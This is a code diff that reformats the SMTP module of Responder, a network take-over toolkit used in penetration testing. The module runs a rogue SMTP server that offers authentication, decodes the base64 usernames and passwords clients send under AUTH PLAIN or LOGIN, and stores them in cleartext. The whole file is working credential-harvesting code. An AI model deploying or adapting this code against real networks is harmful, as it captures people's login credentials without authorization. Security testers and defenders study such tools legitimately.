@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# This file is part of Responder, a network take-over set of tools 
+# This file is part of Responder, a network take-over set of tools
 # created and maintained by Laurent Gaffie.
 # email: laurent.gaffie@gmail.com
 # This program is free software: you can redistribute it and/or modify
@@ -19,61 +19,64 @@ from base64 import b64decode
 from SocketServer import BaseRequestHandler
 from packets import SMTPGreeting, SMTPAUTH, SMTPAUTH1, SMTPAUTH2
 
+
 class ESMTP(BaseRequestHandler):
 
-	def handle(self):
-		try:
-			self.request.send(str(SMTPGreeting()))
-			data = self.request.recv(1024)
+    def handle(self):
+        try:
+            self.request.send(str(SMTPGreeting()))
+            data = self.request.recv(1024)
 
-			if data[0:4] == "EHLO" or data[0:4] == "ehlo":
-				self.request.send(str(SMTPAUTH()))
-				data = self.request.recv(1024)
+            if data[0:4] == "EHLO" or data[0:4] == "ehlo":
+                self.request.send(str(SMTPAUTH()))
+                data = self.request.recv(1024)
 
-			if data[0:4] == "AUTH":
-				AuthPlain = re.findall(r'(?<=AUTH PLAIN )[^\r]*', data)
-				if AuthPlain:
-					User = filter(None, b64decode(AuthPlain[0]).split('\x00'))
-					Username = User[0]
-					Password = User[1]
+            if data[0:4] == "AUTH":
+                AuthPlain = re.findall(r'(?<=AUTH PLAIN )[^\r]*', data)
+                if AuthPlain:
+                    User = filter(None, b64decode(AuthPlain[0]).split('\x00'))
+                    Username = User[0]
+                    Password = User[1]
 
-					SaveToDb({
-						'module': 'SMTP', 
-						'type': 'Cleartext', 
-						'client': self.client_address[0], 
-						'user': Username, 
-						'cleartext': Password, 
-						'fullhash': Username+":"+Password,
-						})
+                    SaveToDb({
+                        'module': 'SMTP',
+                        'type': 'Cleartext',
+                        'client': self.client_address[0],
+                        'user': Username,
+                        'cleartext': Password,
+                        'fullhash': Username + ":" + Password,
+                    })
 
-                                else:
-					self.request.send(str(SMTPAUTH1()))
-					data = self.request.recv(1024)
-				
-					if data:
-						try:
-							User = filter(None, b64decode(data).split('\x00'))
-							Username = User[0]
-							Password = User[1]
-						except:
-							Username = b64decode(data)
+                else:
+                    self.request.send(str(SMTPAUTH1()))
+                    data = self.request.recv(1024)
 
-							self.request.send(str(SMTPAUTH2()))
-							data = self.request.recv(1024)
+                    if data:
+                        try:
+                            User = filter(None, b64decode(data).split('\x00'))
+                            Username = User[0]
+                            Password = User[1]
+                        except BaseException:
+                            Username = b64decode(data)
 
-							if data:
-								try: Password = b64decode(data)
-								except: Password = data
+                            self.request.send(str(SMTPAUTH2()))
+                            data = self.request.recv(1024)
 
-						SaveToDb({
-							'module': 'SMTP', 
-							'type': 'Cleartext', 
-							'client': self.client_address[0], 
-							'user': Username, 
-							'cleartext': Password, 
-							'fullhash': Username+":"+Password,
-						})
+                            if data:
+                                try:
+                                    Password = b64decode(data)
+                                except BaseException:
+                                    Password = data
 
-		except Exception:
-                        raise
-			pass
+                        SaveToDb({
+                            'module': 'SMTP',
+                            'type': 'Cleartext',
+                            'client': self.client_address[0],
+                            'user': Username,
+                            'cleartext': Password,
+                            'fullhash': Username + ":" + Password,
+                        })
+
+        except Exception:
+            raise
+            pass
